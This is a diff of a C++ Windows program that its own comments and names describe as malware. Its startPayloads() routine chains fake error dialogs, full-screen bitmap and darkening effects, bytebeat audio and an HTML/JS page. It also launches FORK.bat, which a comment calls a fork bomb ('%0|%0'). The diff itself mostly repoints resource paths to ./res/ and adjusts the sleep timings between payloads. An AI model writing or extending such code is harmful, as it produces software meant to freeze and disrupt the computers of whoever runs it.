@@ -201,10 +201,10 @@ void WINAPI Bytebeat5() {
 // Add this function near the top of your file, after the includes
 std::wstring getRandomImageFile() {
     const std::array<std::wstring, 4> imageFiles = {
-        L"ded.bmp",
-        L"dedMac.bmp",
-        L"code1.bmp",
-        L"XD.bmp"
+        L"./res/ded.bmp",
+        L"./res/dedMac.bmp",
+        L"./res/code1.bmp",
+        L"./res/XD.bmp"
     };
 
     int randomIndex = random() % imageFiles.size();
@@ -233,7 +233,7 @@ void WINAPI ded(LPVOID lpVoid) {
 void WINAPI REALded(LPVOID lpVoid) {
     // consider it as an ded v2
 
-    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"finale.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
+    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"./res/finale.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
 
     HANDLE thread;
     DWORD ID;
@@ -2059,16 +2059,16 @@ void startPayloads() {
 
 	HANDLE thread;
 	DWORD ID;
-    mciSendString(L"play start.mp3", NULL, 0, NULL);
-    //Sleep(random() % 3000 + 2400);
+    mciSendString(L"play ./res/start.mp3", NULL, 0, NULL);
+    Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 
-    Sleep(random() % 500 + 340);
+    Sleep(random() % 5000 + 340);
     msgXD();
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
     // thanks tabnine
-    system("note.txt");
+    system("./res/note.txt");
 
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
@@ -2229,10 +2229,10 @@ void startPayloads() {
     // Here is when stuff gets a lil' bit stronger:
     Reset(); // stop bytebeat/""malware" music"
     RipBozo();
-    system("LOL.html"); // HTML/JS code :000000
+    system("./LOL/LOL.html"); // HTML/JS code :000000
 
-    mciSendString(L"play finale.mp3", NULL, 0, NULL);
-    system("FORK.bat"); // (forkbomb, %0|%0)
+    mciSendString(L"play ./res/finale.mp3", NULL, 0, NULL);
+    system("./res/FORK.bat"); // (forkbomb, %0|%0)
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     
 	//startPayloads();
